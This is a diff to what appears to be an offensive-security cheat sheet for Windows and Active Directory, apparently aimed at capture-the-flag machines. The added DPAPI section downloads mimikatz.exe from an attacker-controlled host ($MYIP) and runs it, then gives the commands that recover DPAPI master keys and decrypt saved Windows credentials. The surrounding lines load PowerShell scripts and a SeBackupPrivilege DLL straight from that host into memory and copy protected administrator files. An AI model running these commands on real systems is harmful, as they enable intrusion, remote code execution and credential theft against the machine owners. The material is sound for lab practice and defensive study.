@@ -1366,6 +1366,12 @@ IEX (New-Object Net.WebClient).DownloadString('http://$MYIP:8888/Invoke-RunasCs.
 +---------- Restore AD Objects ----------+
 powershell -c "Restore-ADObject -Identity 'GUID or DistinguishedName'"
 
++---------- DPAPI ----------+
+curl http://$MYIP:8888/windows/mimikatz.exe -o \programdata\mimikatz.exe; \programdata\mimikatz.exe
+dpapi::masterkey /in:"...\<USER>\...\...\Microsoft\Protect\<USER_SID>\<CRED_FILE>" /sid:<USER_SID> /rpc
+dpapi::masterkey /in:"...\<USER>\...\...\Microsoft\Protect\<USER_SID>\<CRED_FILE>" /sid:<USER_SID> /password:$PASSWORD /protected
+dpapi::cred /masterkey:<MASTER_KEY> /in:"...\<USER>\...\...\Microsoft\Credentials\<ENCRYPTED_FILE>"
+
 +---------- SeBackupPrivilege ----------+
 $a = [System.Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData('http://$MYIP:8888/windows/SeBackupPrivilegeUtils.dll')); Get-ChildItem C:\Users -Recurse -File -Include user.txt,root.txt | ForEach-Object {$d=Join-Path $env:TEMP "$([guid]::NewGuid()).txt"; [bz.OneOEight.SeBackupPrivilege.SeBackupPrivilegeUtils]::CopyFile($_.FullName,$d,[ref]$true,$true)>$null; Get-Content $d; Remove-Item $d -Force}
 robocopy /b \users\administrator\desktop\ .; type \users\administrator\desktop\root.txt
